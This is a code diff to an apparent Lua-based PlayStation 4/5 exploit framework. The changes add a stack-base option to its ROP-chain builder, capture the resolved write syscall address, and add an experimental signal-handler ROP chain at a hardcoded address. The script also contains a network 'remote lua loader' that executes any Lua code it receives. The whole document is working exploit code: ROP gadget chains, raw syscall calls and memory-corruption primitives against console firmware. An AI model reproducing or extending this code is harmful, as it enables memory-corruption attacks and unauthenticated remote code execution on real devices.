@@ -1,5 +1,5 @@
 
-PLATFORM = "ps5"  -- ps4 or ps5
+PLATFORM = "ps4"  -- ps4 or ps5
 LOG_TO_KLOG = true
 FW_VERSION = nil
 
@@ -1353,12 +1353,12 @@ ropchain = {}
 ropchain.__index = ropchain
 
 setmetatable(ropchain, {
-    __call = function(_, stack_size, padding)  -- make class callable as constructor
-        return ropchain:new(stack_size, padding)
+    __call = function(_, stack_size, padding, stack_base)  -- make class callable as constructor
+        return ropchain:new(stack_size, padding, stack_base)
     end
 })
 
-function ropchain:new(stack_size, padding)
+function ropchain:new(stack_size, padding, stack_base)
 
     stack_size = stack_size or 0x500
 
@@ -1370,7 +1370,8 @@ function ropchain:new(stack_size, padding)
 
     self.stack_offset = 0
     self.stack_size = stack_size + padding
-    self.stack_base = bump.alloc(self.stack_size) + padding
+    self.stack_base = stack_base or bump.alloc(self.stack_size) + padding
+    print(self.stack_base)
     self.stack_backup = bump.alloc(self.stack_size) + padding
     
     self.jmpbuf_size = 0x50
@@ -1456,7 +1457,8 @@ end
 
 function ropchain.resolve_value(v)
     if type(v) == "string" then
-        v = lua.addrof(v.."\0")+24  -- with null terminator
+        -- v = lua.addrof(v.."\0")+24  -- with null terminator
+        v = lua.addrof(v) + 24
     elseif not (is_uint64(v) or type(v) == "number") then
         errorf("ropchain.resolve_value: invalid type (%s)", type(v))
     end
@@ -1766,6 +1768,7 @@ function ropchain:execute()
 
     self:reset_chain()
     -- print(self) -- uncomment to show finalized ropchain
+    
     return self:execute_rop()
 end
 
@@ -1862,6 +1865,7 @@ function syscall_rop:new(syscall_no)
 
     local self = setmetatable({}, syscall_rop)
     self.syscall_no = syscall_no
+    
     return self
 end
 
@@ -1905,10 +1909,14 @@ function syscall.init()
     end
 end
 
+WRITE_ADDR = nil
 function syscall.resolve(list)
     for name, num in pairs(list) do
         if PLATFORM == "ps4" then
             if syscall.syscall_wrapper[num] then
+                if name == "write" then
+                    WRITE_ADDR = syscall.syscall_wrapper[num]
+                end
                 syscall[name] = function_rop(syscall.syscall_wrapper[num])
             else
                 printf("warning: syscall %s (%d) not found", name, num)
@@ -2014,6 +2022,9 @@ function remote_lua_loader(port)
 
     notify(string.format("remote lua loader\nrunning on %s %s\nlistening on port %d",
         PLATFORM, FW_VERSION, port))
+        
+    -- setup signal handler
+    signal_handler()
 
     while true do
 
@@ -2027,6 +2038,8 @@ function remote_lua_loader(port)
  
         syscall.read(client_fd, tmp, 8)
         local size = memory.read_qword(tmp):tonumber()
+        
+        printf("[+] accepted new connection client fd %d", client_fd)
 
         if size > 0 and size < maxsize then            
             
@@ -2034,6 +2047,9 @@ function remote_lua_loader(port)
             local lua_code = memory.read_buffer(buf, size)
             
             printf("[+] accepted lua code with size %d (%s)", #lua_code, hex(#lua_code))
+            
+            -- write to signal handler
+            signal_handler_rop(client_fd)
             
             local output = run_lua_code(lua_code)
             syscall.write(client_fd, output, #output)
@@ -2142,6 +2158,26 @@ function signal_handler()
     sigaction(SIGSEGV, sigaction_struct, 0)
 end
 
+function signal_handler_rop(client_fd)
+    local start_addr = 0xfb0000bd
+    output = "Test from exception handler"
+    
+    local chain = ropchain(0x500, 0x100, 0xfb0000bd - 0x8)
+    
+    chain:push_set_rdi(ropchain.resolve_value(client_fd))
+    chain:push_set_rsi(lua.addrof(output)+24)
+    chain:push_set_rdx(ropchain.resolve_value(#output))
+    chain:push_set_rcx(0)
+    chain:push_set_r8(0)
+    chain:push_set_r9(0)
+    chain:push_set_rax(4) -- syscall_num
+    chain:push_fcall_raw(WRITE_ADDR)
+    chain:push_store_retval()
+    
+    -- memory.write_qword(start_addr, gadgets["pop rsp; ret"])
+    -- memory.write_qword(start_addr + 0x8, chain.stack_base + 0x8)
+end
+
 function main()
 
     -- setup read & limited write primitives
@@ -2184,7 +2220,6 @@ function main()
     print("[+] syscall resolved")
 
     FW_VERSION = get_version()
-    signal_handler()
 
     -- stable but exhaust memory
     run_nogc(function()
